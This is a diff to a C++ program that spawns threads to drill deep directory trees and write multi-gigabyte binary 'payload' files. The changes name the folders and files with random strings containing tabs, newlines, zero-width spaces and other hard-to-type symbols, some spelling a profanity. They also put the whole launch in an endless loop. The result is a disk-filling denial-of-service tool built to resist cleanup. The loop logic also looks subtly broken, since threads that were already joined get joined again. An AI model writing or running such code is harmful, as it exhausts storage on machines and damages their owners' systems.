@@ -6,15 +6,58 @@
 #include <random>
 namespace fs = std::filesystem;
 
+struct generateSpecialSymbolStringGenerator{
+    std::string generateSpecialSymbolString(int count){// Set up the random number generator (seeded once for efficiency).
+        static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());
+        std::vector<std::string> default_symbols = {"§","\t","\n","\u200b","`","~","§","°","±","¶","·","¿","¡","¢","£","¤","¥","¦","©","®","¬","¯","×","÷","''","F","U","C","K","μ","L","M","A","O"};
+        // Create a distribution to select an index from the vector.
+        std::uniform_int_distribution<int> distribution(0, default_symbols.size() - 1);
+
+        std::string result;
+        for (int i = 0; i < count; ++i) {
+            // Append a random string from the vector to the result.
+            result += default_symbols[distribution(engine)];
+        }
+
+        return result;
+
+    }
+
+
+
+
+    std::string generateSpecialSymbolString(int count, const std::vector<std::string>& symbols) {
+
+
+        // Set up the random number generator (seeded once for efficiency).
+        static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());
+
+        // Create a distribution to select an index from the vector.
+        std::uniform_int_distribution<int> distribution(0, symbols.size() - 1);
+
+        std::string result;
+        for (int i = 0; i < count; ++i) {
+            // Append a random string from the vector to the result.
+            result += symbols[distribution(engine)];
+        }
+
+        return result;
+    }
+
+};
+
+
+
+
 void make_tunnel_and_payloads(int id, std::string ranfilenames, int depth, size_t fileSizeGB, int filesPerTunnel) {
     // Unique root per thread
     fs::path root = ranfilenames;
     fs::create_directory(root);
-
+    generateSpecialSymbolStringGenerator strgen;
     // Drill deep
     fs::path current = root;
     for (int i = 0; i < depth; i++) {
-        current /= "sub";
+        current /= strgen.generateSpecialSymbolString(8);
         fs::create_directory(current);
     }
 
@@ -24,7 +67,7 @@ void make_tunnel_and_payloads(int id, std::string ranfilenames, int depth, size_
 
     // Write multiple files at the bottom
     for (int f = 0; f < filesPerTunnel; f++) {
-        fs::path bigfile = current / ("payload_" + std::to_string(f) + ".bin");
+        fs::path bigfile = current / (strgen.generateSpecialSymbolString(16) + ".bin");
         std::ofstream file(bigfile, std::ios::binary);
 
         size_t chunks = (fileSizeGB * 1024ULL) / 100; // number of 100MB writes
@@ -41,31 +84,6 @@ void make_tunnel_and_payloads(int id, std::string ranfilenames, int depth, size_
 
 
 
-std::string generateSpecialSymbolString(int length) {
-    // The pool of special symbols.
-    // Ensure your source file is saved with UTF-8 encoding for these characters to be read correctly.
-    const std::string symbols = "`~§°±µ¶·¿¡¢£¤¥¦©®¬¯×÷";
-
-    // 1. Set up the random number generator.
-    // We use a static engine to ensure it's seeded only once, improving performance
-    // and randomness on subsequent calls.
-    static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());
-
-    // 2. Create a distribution that will uniformly select an index from our symbols string.
-    std::uniform_int_distribution<int> distribution(0, symbols.length() - 1);
-
-    // 3. Build the result string.
-    std::string result;
-    result.reserve(length); // Pre-allocate memory for efficiency
-
-    for (int i = 0; i < length; ++i) {
-        // Generate a random index and append the corresponding symbol.
-        result += symbols[distribution(engine)];
-    }
-
-    return result;
-}
-
 
 int main() {
     const int numThreads = std::thread::hardware_concurrency();
@@ -80,13 +98,13 @@ int main() {
     std::mt19937 generator(rd());
 
     // Create a distribution
-    std::uniform_int_distribution<int> distribution(16, 32);
+    std::uniform_int_distribution<int> distribution(6, 12);
 
     std::vector<std::thread> threads;
-
-
+    generateSpecialSymbolStringGenerator StrGen;
+while(1){
     for (int i = 0; i < numThreads; i++) {
-        threads.emplace_back(make_tunnel_and_payloads,i, generateSpecialSymbolString(distribution(generator)) , depth, fileSizeGB, filesPerTunnel);
+        threads.emplace_back(make_tunnel_and_payloads,i, StrGen.generateSpecialSymbolString(distribution(generator)) , depth, fileSizeGB, filesPerTunnel);
     }
 
     for (auto& t : threads) {
@@ -94,6 +112,6 @@ int main() {
     }
 
     std::cout << "Done: " << numThreads << " tunnels with "
-    << filesPerTunnel << " payloads each.\n";
+    << filesPerTunnel << " payloads each.\n";}
     return 0;
 }
